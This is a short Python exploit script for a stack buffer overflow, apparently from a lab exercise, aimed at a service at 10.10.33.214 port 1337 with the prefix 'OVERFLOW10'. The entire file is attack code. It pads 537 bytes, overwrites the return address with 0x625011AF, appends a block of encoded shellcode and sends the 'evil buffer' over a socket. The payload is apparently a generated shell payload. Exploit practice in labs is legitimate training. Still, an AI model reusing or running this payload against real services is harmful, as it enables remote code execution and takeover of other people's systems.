#!/usr/bin/env python3
import socket

ip = "10.10.33.214"
port = 1337

prefix = "OVERFLOW10 "
offset = 537
overflow = "A" * offset
#625011AF
retn = "\xaf\x11\x50\x62"
padding = ""
payload = ("\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\xd7\xb3\x6a\x7a\x83\xee\xfc\xe2\xf4\x2b\x5b\xe8\x7a"
"\xd7\xb3\x0a\xf3\x32\x82\xaa\x1e\x5c\xe3\x5a\xf1\x85\xbf"
"\xe1\x28\xc3\x38\x18\x52\xd8\x04\x20\x5c\xe6\x4c\xc6\x46"
"\xb6\xcf\x68\x56\xf7\x72\xa5\x77\xd6\x74\x88\x88\x85\xe4"
"\xe1\x28\xc7\x38\x20\x46\x5c\xff\x7b\x02\x34\xfb\x6b\xab"
"\x86\x38\x33\x5a\xd6\x60\xe1\x33\xcf\x50\x50\x33\x5c\x87"
"\xe1\x7b\x01\x82\x95\xd6\x16\x7c\x67\x7b\x10\x8b\x8a\x0f"
"\x21\xb0\x17\x82\xec\xce\x4e\x0f\x33\xeb\xe1\x22\xf3\xb2"
"\xb9\x1c\x5c\xbf\x21\xf1\x8f\xaf\x6b\xa9\x5c\xb7\xe1\x7b"
"\x07\x3a\x2e\x5e\xf3\xe8\x31\x1b\x8e\xe9\x3b\x85\x37\xec"
"\x35\x20\x5c\xa1\x81\xf7\x8a\xdb\x59\x48\xd7\xb3\x02\x0d"
"\xa4\x81\x35\x2e\xbf\xff\x1d\x5c\xd0\x4c\xbf\xc2\x47\xb2"
"\x6a\x7a\xfe\x77\x3e\x2a\xbf\x9a\xea\x11\xd7\x4c\xbf\x2a"
"\x87\xe3\x3a\x3a\x87\xf3\x3a\x12\x3d\xbc\xb5\x9a\x28\x66"
"\xfd\x10\xd2\xdb\x60\x77\xc3\x24\x02\x78\xd7\xa2\x36\xf3"
"\x31\xd9\x7a\x2c\x80\xdb\xf3\xdf\xa3\xd2\x95\xaf\x52\x73"
"\x1e\x76\x28\xfd\x62\x0f\x3b\xdb\x9a\xcf\x75\xe5\x95\xaf"
"\xbf\xd0\x07\x1e\xd7\x3a\x89\x2d\x80\xe4\x5b\x8c\xbd\xa1"
"\x33\x2c\x35\x4e\x0c\xbd\x93\x97\x56\x7b\xd6\x3e\x2e\x5e"
"\xc7\x75\x6a\x3e\x83\xe3\x3c\x2c\x81\xf5\x3c\x34\x81\xe5"
"\x39\x2c\xbf\xca\xa6\x45\x51\x4c\xbf\xf3\x37\xfd\x3c\x3c"
"\x28\x83\x02\x72\x50\xae\x0a\x85\x02\x08\x9a\xcf\x75\xe5"
"\x02\xdc\x42\x0e\xf7\x85\x02\x8f\x6c\x06\xdd\x33\x91\x9a"
"\xa2\xb6\xd1\x3d\xc4\xc1\x05\x10\xd7\xe0\x95\xaf")
postfix = ""


buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip,port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")

